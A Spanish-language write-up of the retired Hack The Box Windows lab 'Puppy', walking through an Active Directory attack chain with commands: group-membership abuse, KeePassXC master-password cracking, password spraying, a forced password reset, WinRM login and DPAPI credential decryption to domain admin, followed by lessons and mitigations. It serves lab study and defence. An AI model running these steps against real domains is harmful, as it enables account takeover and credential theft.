---
machine: Puppy
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, genericwrite, keepassxc, genericall, dpapi, privesc]
---

# Puppy — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Credenciales de un usuario de RR. HH. permiten escribir en el grupo Developers y acceder a un share con una base KeePassXC. La contraseña maestra se crackea y el vault se exporta; un spray llega a `ant.edwards`, que tiene GenericAll sobre `adam.silver` y permite resetear su contraseña. Un backup del sitio filtra la contraseña de `steph.cooper`, y una credencial DPAPI guardada da `steph.cooper_adm`, administrador del dominio.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,5985,3268 <IP>
```

- Controlador de dominio `PUPPY.HTB` con DNS, Kerberos, LDAP, SMB y WinRM.
- `netexec` confirma el dominio y los servicios.
- El escenario es un pentest AD con credenciales iniciales de RR. HH.

## Enumeración

Con `levi.james` se enumera BloodHound: pertenece a HR y tiene `GenericWrite` sobre el grupo Developers. Se añade a sí mismo al grupo y se accede al share `dev`, que contiene una base `recovery.kdbx` y el instalador de KeePassXC.

```bash
net rpc group addmem developers levi.james -U puppy.htb/levi.james%<PASS> -S puppy.htb
smbclient //puppy.htb/dev -U puppy.htb/levi.james%<PASS>
```

## Foothold

`keepass2john`/`john-the-ripper.keepass2john` extrae el hash Argon2 y se crackea la contraseña maestra. `keepassxc-cli export` vuelca las credenciales y un spray contra todos los usuarios encuentra las de `ant.edwards`.

```bash
john-the-ripper.keepass2john recovery.kdbx > keepass.hash
john --wordlist=rockyou.txt keepass.hash
keepassxc-cli export --format csv recovery.kdbx
netexec smb puppy.htb -u users.txt -p passwords.txt --continue-on-success
```

## Movimiento lateral

`ant.edwards` está en Senior Devs y tiene `GenericAll` sobre `adam.silver`. Se resetea su contraseña y se entra por WinRM.

```bash
net rpc password adam.silver '<NEWPASS>' -U puppy.htb/ant.edwards%<PASS> -S puppy.htb
evil-winrm -i puppy.htb -u adam.silver -p '<NEWPASS>'
```

## Escalada de privilegios

`adam.silver` puede leer `C:\Backups\site-backup-2024-12-30.zip`. El backup contiene `nms-auth-config.xml.bak` con la contraseña de `steph.cooper`; esa cuenta guarda una credencial DPAPI de `steph.cooper_adm`, que es administrador.

```powershell
dpapi.py masterkey -file <MASTERKEY> -sid <SID> -password <PASS>
dpapi.py credential -file <CRED> -key <KEY>
```

## Evidencia

- `GenericWrite` sobre Developers.
- Share `dev` y KeePassXC.
- Cracking y spray a `ant.edwards`.
- `GenericAll` sobre `adam.silver`.
- Backup, DPAPI y `steph.cooper_adm`.

## Lecciones aprendidas

- Un `GenericWrite` sobre un grupo permite añadirse y ampliar el acceso.
- Las bases KeePassXC con contraseñas débiles se crackean.
- Un vault exportado alimenta un password spray.
- `GenericAll` permite resetear la contraseña de otro usuario.
- Los backups de aplicaciones filtran credenciales de servicio.

## Mitigación y detección

- Auditar `GenericWrite`/`GenericAll` y grupos privilegiados.
- Usar contraseñas maestras fuertes y MFA.
- Limitar el acceso a backups y secretos.
- Proteger DPAPI y rotar credenciales de servicio.

## Referencias

- [0xdf — Puppy](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [IppSec — Puppy](https://www.youtube.com/watch?v=QZQ-IjsI5Qk)
- [Hack The Box — Puppy](https://app.hackthebox.com/machines/puppy)
